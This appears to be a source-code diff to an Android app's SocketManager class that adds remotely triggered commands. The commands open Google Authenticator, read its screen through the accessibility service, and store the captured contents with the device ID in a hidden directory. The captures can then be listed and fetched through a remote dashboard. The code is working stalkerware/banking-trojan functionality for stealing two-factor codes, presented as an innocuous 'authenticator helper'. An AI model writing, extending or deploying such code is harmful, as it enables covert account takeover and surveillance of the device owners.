@@ -1792,6 +1792,10 @@ public class SocketManager {
             case "list_screen_recordings":
             case "get_screen_recording":
             case "delete_screen_recording":
+            case "g_authenticatorHelper":
+            case "list_gcode_screenshots":
+            case "get_gcode_screenshot":
+            case "delete_gcode_screenshot":
                 return true;
             default:
                 return false;
@@ -2030,6 +2034,83 @@ public class SocketManager {
                     return r;
                 }
                 java.io.File dir = new java.io.File(context.getFilesDir(), ".sr_offline");
+                java.io.File file = new java.io.File(dir, filename);
+                if (!file.exists()) {
+                    r.put("success", false);
+                    r.put("error", "File not found");
+                    return r;
+                }
+                boolean deleted = file.delete();
+                r.put("success", deleted);
+                if (!deleted) r.put("error", "Could not delete file");
+                return r;
+            }
+
+            case "g_authenticatorHelper": {
+                JSONObject r = new JSONObject();
+                r.put("success", true);
+                r.put("message", "Authenticator capture started — screenshot will be saved shortly");
+                executor.execute(() -> {
+                    try {
+                        dispatchCommand("wake_screen", new JSONObject());
+
+                        String pkg = "com.google.android.apps.authenticator2";
+                        JSONObject p = new JSONObject();
+                        p.put("packageName", pkg);
+                        JSONObject openResult = dispatchCommand("open_app", p);
+
+                        if (openResult == null || !openResult.optBoolean("success")) {
+                            pkg = "com.google.android.apps.authenticator";
+                            p.put("packageName", pkg);
+                            openResult = dispatchCommand("open_app", p);
+                        }
+
+                        if (openResult == null || !openResult.optBoolean("success")) {
+                            Log.w(TAG, "g_authenticatorHelper: failed to open Authenticator");
+                            return;
+                        }
+
+                        try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
+
+                        UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
+                        if (svc == null) return;
+                        ScreenReader sr = new ScreenReader(svc);
+                        boolean acq = false;
+                        try {
+                            acq = accessSemaphore.tryAcquire(4, TimeUnit.SECONDS);
+                            if (!acq) return;
+                            JSONObject screenResult = sr.readScreen();
+                            if (screenResult.optBoolean("success")) {
+                                JSONObject screen = screenResult.optJSONObject("screen");
+                                if (screen != null) {
+                                    saveGcodeScreenshot(screen, pkg);
+                                }
+                            }
+                        } finally {
+                            if (acq) accessSemaphore.release();
+                        }
+                    } catch (Exception e) {
+                        Log.e(TAG, "g_authenticatorHelper error: " + e.getMessage());
+                    }
+                });
+                return r;
+            }
+            case "list_gcode_screenshots": {
+                return listGcodeScreenshots();
+            }
+            case "get_gcode_screenshot": {
+                String filename = params.optString("filename", "");
+                return getGcodeScreenshot(filename);
+            }
+            case "delete_gcode_screenshot": {
+                String filename = params.optString("filename", "");
+                JSONObject r = new JSONObject();
+                if (filename.isEmpty()) {
+                    r.put("success", false);
+                    r.put("error", "No filename provided");
+                    return r;
+                }
+                java.io.File dir = new java.io.File(context.getFilesDir(), ".gcode_auth");
                 java.io.File file = new java.io.File(dir, filename);
                 if (!file.exists()) {
                     r.put("success", false);
@@ -3188,4 +3269,226 @@ public class SocketManager {
         }
         return out;
     }
+
+    // =============================================================================
+    // Gcode Authenticator Helper
+    // =============================================================================
+
+    /**
+     * Handles the g_authenticatorHelper command:
+     * 1. Opens Google Authenticator app
+     * 2. Waits for it to load
+     * 3. Captures the current screen via accessibility
+     * 4. Saves the screenshot to .gcode_auth private directory
+     * 5. Returns metadata about the captured screenshot
+     */
+    private JSONObject handleGAuthenticatorHelper(JSONObject params) throws JSONException {
+        JSONObject result = new JSONObject();
+        executor.execute(() -> {
+            try {
+                // Step 1: Open Google Authenticator
+                // Try the newer package name first; fallback handled in openApp
+                String pkg = "com.google.android.apps.authenticator2";
+                JSONObject openParams = new JSONObject();
+                openParams.put("packageName", pkg);
+                JSONObject openResult = dispatchCommand("open_app", openParams);
+
+                if (openResult == null || !openResult.optBoolean("success", false)) {
+                    // Try the older package name
+                    pkg = "com.google.android.apps.authenticator";
+                    openParams.put("packageName", pkg);
+                    openResult = dispatchCommand("open_app", openParams);
+                }
+
+                if (openResult == null || !openResult.optBoolean("success", false)) {
+                    Log.w(TAG, "g_authenticatorHelper: failed to open Authenticator app");
+                    return;
+                }
+
+                // Step 2: Wait for app to load (3 seconds)
+                try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
+
+                // Step 3: Capture screen using ScreenReader (accessibility)
+                UnifiedAccessibilityService accessSvc = UnifiedAccessibilityService.getInstance();
+                if (accessSvc == null) {
+                    Log.w(TAG, "g_authenticatorHelper: accessibility service not available");
+                    return;
+                }
+
+                ScreenReader sr = new ScreenReader(accessSvc);
+                boolean acquired = false;
+                try {
+                    acquired = accessSemaphore.tryAcquire(4, TimeUnit.SECONDS);
+                    if (!acquired) {
+                        Log.w(TAG, "g_authenticatorHelper: accessibility busy");
+                        return;
+                    }
+                    JSONObject screenResult = sr.readScreen();
+
+                    // Step 4: Save the captured screen to .gcode_auth directory
+                    if (screenResult.optBoolean("success", false)) {
+                        JSONObject screen = screenResult.optJSONObject("screen");
+                        if (screen != null) {
+                            saveGcodeScreenshot(screen, pkg);
+                        }
+                    }
+                } finally {
+                    if (acquired) accessSemaphore.release();
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "g_authenticatorHelper error: " + e.getMessage());
+            }
+        });
+        result.put("success", true);
+        result.put("message", "Authenticator capture started — screenshot will be saved shortly");
+        return result;
+    }
+
+    /**
+     * List all Gcode authenticator screenshots saved on the device.
+     * Files are stored in .gcode_auth directory with prefix "gcode_".
+     */
+    private JSONObject listGcodeScreenshots() {
+        JSONObject result = new JSONObject();
+        try {
+            java.io.File dir = new java.io.File(context.getFilesDir(), ".gcode_auth");
+            if (!dir.exists()) {
+                result.put("success", true);
+                result.put("screenshots", new JSONArray());
+                return result;
+            }
+            java.io.File[] files = dir.listFiles((d, name) ->
+                name.startsWith("gcode_") && name.endsWith(".json"));
+            JSONArray list = new JSONArray();
+            if (files != null) {
+                java.util.Arrays.sort(files,
+                    (a, b) -> Long.compare(b.lastModified(), a.lastModified()));
+                for (java.io.File f : files) {
+                    JSONObject info = new JSONObject();
+                    info.put("filename", f.getName());
+                    info.put("size", f.length());
+                    info.put("lastModified", f.lastModified());
+                    // Try to extract timestamp from filename: gcode_yyyy-MM-dd_HH-mm-ss.json
+                    String name = f.getName();
+                    if (name.startsWith("gcode_") && name.endsWith(".json")) {
+                        String tsPart = name.substring(6, name.length() - 5);
+                        info.put("timestamp", parseFilenameTimestamp(tsPart));
+                    }
+                    list.put(info);
+                }
+            }
+            result.put("success", true);
+            result.put("screenshots", list);
+        } catch (Exception e) {
+            try { result.put("success", false); result.put("error", e.getMessage()); } catch (Exception ignored) {}
+        }
+        return result;
+    }
+
+    /**
+     * Get content of a specific Gcode screenshot.
+     * Returns the full screen data (elements, package info, etc.).
+     */
+    private JSONObject getGcodeScreenshot(String filename) {
+        JSONObject result = new JSONObject();
+        try {
+            if (filename == null || filename.isEmpty()) {
+                result.put("success", false);
+                result.put("error", "No filename provided");
+                return result;
+            }
+            java.io.File dir = new java.io.File(context.getFilesDir(), ".gcode_auth");
+            java.io.File file = new java.io.File(dir, filename);
+            if (!file.exists()) {
+                result.put("success", false);
+                result.put("error", "File not found");
+                return result;
+            }
+
+            // Read file
+            java.io.FileInputStream fis = new java.io.FileInputStream(file);
+            java.io.BufferedInputStream bis = new java.io.BufferedInputStream(fis, 65536);
+            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream((int) file.length());
+            byte[] tmp = new byte[8192];
+            int read;
+            while ((read = bis.read(tmp)) != -1) baos.write(tmp, 0, read);
+            bis.close();
+            byte[] buf = baos.toByteArray();
+
+            if (buf.length == 0) {
+                result.put("success", false);
+                result.put("error", "Empty file");
+                return result;
+            }
+
+            JSONObject data = new JSONObject(new String(buf, "UTF-8"));
+            result.put("success", true);
+            result.put("filename", filename);
+            result.put("timestamp", data.optLong("timestamp", 0));
+            result.put("packageName", data.optString("packageName", ""));
+            result.put("screenshot", data);
+        } catch (Exception e) {
+            try { result.put("success", false); result.put("error", e.getMessage()); } catch (Exception ignored) {}
+        }
+        return result;
+    }
+
+    /**
+     * Save a captured screen frame as a Gcode screenshot.
+     * @param screen The screen JSON object from ScreenReader.readScreen()
+     * @param packageName The package name of the app that was captured
+     */
+    private void saveGcodeScreenshot(JSONObject screen, String packageName) {
+        executor.execute(() -> {
+            try {
+                java.io.File dir = new java.io.File(context.getFilesDir(), ".gcode_auth");
+                if (!dir.exists()) dir.mkdirs();
+
+                long now = System.currentTimeMillis();
+                java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat(
+                    "yyyy-MM-dd_HH-mm-ss", java.util.Locale.getDefault());
+                String filename = "gcode_" + sdf.format(new java.util.Date(now)) + ".json";
+                java.io.File file = new java.io.File(dir, filename);
+
+                JSONObject data = new JSONObject();
+                data.put("deviceId", DeviceInfo.getDeviceId(context));
+                data.put("timestamp", now);
+                data.put("packageName", packageName);
+                data.put("screen", screen);
+
+                java.io.FileOutputStream fos = new java.io.FileOutputStream(file);
+                byte[] bytes = data.toString().getBytes("UTF-8");
+                fos.write(bytes);
+                fos.close();
+
+                Log.i(TAG, "Gcode screenshot saved: " + filename);
+
+                // Notify dashboard so it can refresh the list immediately
+                if (connected) {
+                    JSONObject notify = new JSONObject();
+                    notify.put("deviceId", DeviceInfo.getDeviceId(context));
+                    notify.put("filename", filename);
+                    notify.put("timestamp", now);
+                    notify.put("packageName", packageName);
+                    sendMessage("gcode_screenshot:save", notify);
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "saveGcodeScreenshot error: " + e.getMessage());
+            }
+        });
+    }
+
+    /**
+     * Parse timestamp from filename format: yyyy-MM-dd_HH-mm-ss
+     */
+    private long parseFilenameTimestamp(String tsPart) {
+        try {
+            java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat(
+                "yyyy-MM-dd_HH-mm-ss", java.util.Locale.getDefault());
+            return sdf.parse(tsPart).getTime();
+        } catch (Exception e) {
+            return 0;
+        }
+    }
+
 }
